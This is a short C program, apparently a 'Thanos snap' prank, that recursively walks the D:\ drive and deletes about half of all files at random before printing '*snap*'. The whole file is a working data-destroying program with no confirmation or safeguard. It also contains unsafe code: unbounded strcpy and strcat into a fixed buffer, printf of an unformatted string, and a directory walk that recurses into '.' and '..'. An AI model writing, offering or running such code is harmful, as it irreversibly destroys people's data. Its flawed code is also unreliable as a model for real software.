#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <time.h>

#define MAX_PATH_LENGTH 1000
#define START_PATH "D:\\"
#define WIDTH 80
#define WHITE 15
#define MAGENTA 5

int main(void)
{
    const char *a = "...";
    const char *b = "*snap*";

    // Print text a
    textcolor(MAGENTA);
    prnt(a);

    // Process files
    srand(time(0));
    files(START_PATH);

    // Print text b
    prnt(b);

    // Wait for user to press key
    getch();

    return 0;
}

// Process all files
int files(char *basePath)
{
    char path[MAX_PATH_LENGTH];
    struct dirent *dp;
    DIR *dir = opendir(basePath);

    // Return on error
    if (!dir) return -1;

    dp = readdir(dir);

    while (dp != NULL)
    {
	    // Construct a new path from base path
	    strcpy(path, basePath);
	    strcat(path, "/");
	    strcat(path, dp->d_name);

	    // Process files
	    if (exists(path) == 0)
	    {
	        // path is not a directory
	        if ((rand() % 2) == 0) remove(path);
	    }
	    else
	    {
	        // Recurse through other directories
	        files(path);
	    }

	    dp = readdir(dir);
    }

    closedir(dir);
    return 0;
}

// Check if path is a valid directory
int exists(char *path)
{
    DIR *dir = opendir(path);

    if (dir)
    {
	    closedir(dir);
	    return 1;
    }
    else
    {
	    return 0;
    }

}

// Print text to screen horizontally centered
int prnt(char *str)
{
    clrscr();
    printf("\n\n%*c", (WIDTH / 2 - strlen(str) / 2), ' ');
    printf(str);

    printf("\n%*c", WIDTH / 2, ' ');

    return 0;
}